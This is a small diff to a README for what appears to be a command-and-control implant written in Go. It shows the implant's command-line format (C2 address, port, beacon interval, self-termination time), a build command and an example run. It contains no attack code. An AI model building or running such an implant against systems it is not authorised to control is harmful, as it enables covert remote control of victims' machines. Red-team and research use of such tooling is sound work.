@@ -8,7 +8,7 @@
 
 #### Command Format:
 #### `implant_executable C2_ADDRESS C2_PORT CALL_INTERVAL DEATH_TIME`
-#### supports XXs XXm XXh XXd (seconds, minutes, hours)
+#### supports XXs XXm XXh XXd (seconds, minutes, hours) for the CALL_INTERVAL and DEATH_TIME
 
 run: `go build implant`
 * Windows: `.\implant 192.168.253.1 50555 3s 15s`
